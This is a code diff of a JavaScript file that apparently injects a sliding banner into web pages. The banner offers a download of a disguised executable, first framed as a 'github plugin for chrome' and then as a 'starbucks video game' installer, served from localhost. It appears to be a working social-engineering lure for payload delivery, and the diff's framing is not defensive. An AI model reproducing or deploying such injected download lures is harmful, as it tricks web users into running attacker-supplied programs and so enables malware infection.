@@ -1,5 +1,4 @@
 
-
 function createBanner(config)
 {
     var height = 50;
@@ -17,7 +16,8 @@ function createBanner(config)
     banner.style.zIndex = "999";
     banner.style.transition = "all 1s linear";
     document.body.appendChild(banner);
-    banner.innerHTML = config.innerHTML;
+    var link = "<a style='color:" + config.colorLink + "' id='linklinklink' href='" + config.link + "' download>" + config.linkword + "</a>";
+    banner.innerHTML = config.message.replace(config.linkword, link);
     setTimeout(function() {
         banner.style.top = "0px";
     }, 1000);
@@ -28,9 +28,12 @@ function createBanner(config)
 }
 
 var banner = {
-	innerHTML : "Try a new github plugin for chrome <a id='linklinklink' href='http://localhost/github-installer.exe' download> here !</a>&nbsp;&nbsp;&nbsp;&nbsp;",
-	backgroundColor : "#e5e5e5",
-	color : "black",
+	message : "Try the starbucks video game here, download it now",
+    linkword : "here",
+    link : "http://localhost/starbucks-videogame-installer.exe",
+	backgroundColor : "black",
+	color : "white",
+    colorLink : "silver",
 }
 
 createBanner(banner);
